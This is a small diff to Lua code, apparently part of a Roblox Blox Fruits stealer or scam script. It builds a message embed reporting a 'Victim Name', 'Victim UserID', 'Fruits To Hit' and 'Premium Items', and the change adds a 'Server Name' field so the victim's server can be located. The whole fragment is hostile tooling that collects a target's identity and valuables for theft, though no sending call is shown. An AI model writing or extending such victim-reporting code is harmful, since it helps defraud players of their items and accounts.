@@ -621,6 +621,7 @@ local embed = {
     fields = {
         {name = "Victim Name", value = PlayerName, inline = true},
         {name = "Victim UserID", value = tostring(PlayerUserId), inline = true},
+        {name = "Server Name", value = ServerBrowser, inline = true},
         {name = "Fruits To Hit", value = table.concat(FruitsFormatted, "\n"), inline = false},
         {name = "Premium Items", value = formatPremiumItems(), inline = false},
         {name = "Sea", value = Sea, inline = true},
